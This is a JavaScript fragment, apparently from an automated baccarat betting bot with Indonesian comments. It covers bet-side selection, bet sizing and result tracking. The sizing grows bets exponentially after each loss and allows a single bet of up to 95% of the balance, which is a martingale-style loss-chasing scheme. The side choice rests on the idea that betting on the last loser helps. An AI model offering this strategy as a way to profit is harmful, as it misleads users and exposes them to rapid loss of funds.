    function getReverseTrendSide() {
        // Reverse trend: bet di side yang KALAH terakhir
        if (bot.baccarat.lastLoser && bot.baccarat.lastLoser !== "tie") {
            return bot.baccarat.lastLoser;
        }
        // fallback ke player
        return "player";
    }
    
    function calculateBaccaratBet() {
        const baseBet = bot.baccarat.baseBet;
        const multiplier = Math.pow(bot.baccarat.increaseRate, bot.baccarat.consecutiveLosses);
        let betAmount = baseBet * multiplier;
        
        // Batasi tidak melebihi balance
        if (betAmount > bot.stats.currentBal) {
            betAmount = bot.stats.currentBal * 0.95;
        }
        if (betAmount < bot.minBet) betAmount = bot.minBet;
        
        return betAmount;
    }
    
    function processBaccaratResult(betResult, betSide, betAmount) {
        const cardsData = parseBaccaratCards(betResult);
        bot.baccarat.cards = cardsData;
        
        const result = cardsData.winner;
        const payout = betResult?.payout || 0;
        const pnl = payout - betAmount;
        
        const isWin = (result === betSide);
        const isTie = (result === "tie");
        
        // Update tracking
        bot.baccarat.lastResult = result;
        bot.baccarat.lastBetSide = betSide;
        bot.baccarat.lastBetAmount = betAmount;
        
        if (isWin) {
            bot.baccarat.consecutiveLosses = 0;
            bot.baccarat.lastWinner = betSide;
            bot.baccarat.lastLoser = null;
            bot.baccarat.lossSinceStart = Math.max(0, bot.baccarat.lossSinceStart - Math.abs(pnl));
        } else if (isTie) {
            // Tie: tidak menang tidak kalah, tidak mengubah streak
            // Tidak ada perubahan pada lossSinceStart
        } else {
            bot.baccarat.consecutiveLosses++;
            bot.baccarat.lastLoser = betSide;
            bot.baccarat.lastWinner = null;
            bot.baccarat.lossSinceStart += betAmount;
        }
        
        bot.baccarat.betCount++;
        
        // Update stats global
        bot.stats.bets++;
        bot.stats.wagered += betAmount;
        bot.stats.currentBal += pnl;
        bot.stats.profit += pnl;
        
        if (isWin) {
            bot.stats.wins++;
        } else if (!isTie) {
            bot.stats.loss++;
        }
        
        if (bot.stats.currentBal < bot.stats.startBal) {
            let dd = bot.stats.startBal - bot.stats.currentBal;
            if (dd > bot.stats.maxDD) bot.stats.maxDD = dd;
        }
        
        // Update display
        updateBaccaratDisplay();
        
        return { isWin, isTie, pnl, result };
    }
    
